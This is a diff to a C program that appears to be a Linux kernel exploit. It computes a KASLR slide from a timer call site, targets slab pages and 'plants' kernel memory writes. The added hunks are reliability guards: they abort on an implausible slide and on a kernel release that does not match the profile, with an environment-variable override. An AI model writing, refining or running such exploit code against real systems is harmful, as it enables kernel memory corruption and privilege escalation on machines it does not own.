@@ -56,6 +56,7 @@
 #include <sys/prctl.h>
 #include <sys/resource.h>
 #include <sys/stat.h>
+#include <sys/utsname.h>
 
 #define TR "/sys/kernel/tracing"
 #define CPU_TRIG 2
@@ -1628,6 +1629,19 @@ static void run_plant(unsigned long long target, int tag, int mode,
     pfn = (V - g_base) >> 12;
     slab_pfn = pfn & ~1ULL;
     g_slide = site0 - (g_timer_site_kind ? STATIC_TIMER_SITE_2 : STATIC_TIMER_SITE);
+
+    /* KASLR text slides are 2 MiB aligned and well under 16 GiB.  An
+     * implausible value means the captured call site belongs to another
+     * build (low21 collision); stop before any write. */
+    if ((g_slide & 0x1fffffULL) || g_slide > 0x400000000ULL)
+    {
+        logf("[-] plant%d implausible slide %#llx (site=%#llx); refusing\n",
+             tag, g_slide, site0);
+        kill(T, SIGKILL);
+        waitpid(T, NULL, 0);
+        kill_target_group(T);
+        return;
+    }
     if (g_rel_mode)
         target = g_rel_static + g_slide + g_rel_off;
 
@@ -2247,6 +2261,23 @@ int main(int argc, char **argv)
     signal(SIGINT, SIG_IGN);
     signal(SIGTERM, SIG_IGN);
     signal(SIGPIPE, SIG_IGN);
+
+    /* Refuse to run a profile against a kernel it was not derived from.
+     * A mismatch normally fails harmlessly at the timer-call-site match,
+     * but a wrong slide would make every write land somewhere random. */
+    {
+        const char *allow = getenv("IC_ALLOW_ANY_KERNEL");
+        struct utsname un;
+
+        if (!allow && uname(&un) == 0 &&
+            !strstr(un.release, PROFILE_KERNEL_MATCH))
+        {
+            logf("[-] kernel %s does not match profile %s (need %s);\n"
+                 "    set IC_ALLOW_ANY_KERNEL=1 to override\n",
+                 un.release, IC_PROFILE_NAME, PROFILE_KERNEL_MATCH);
+            return 1;
+        }
+    }
     if (argc > 1 && !strcmp(argv[1], "wait"))
         return wait_child_main(argc > 2 ? argv[2] : "verify");
 
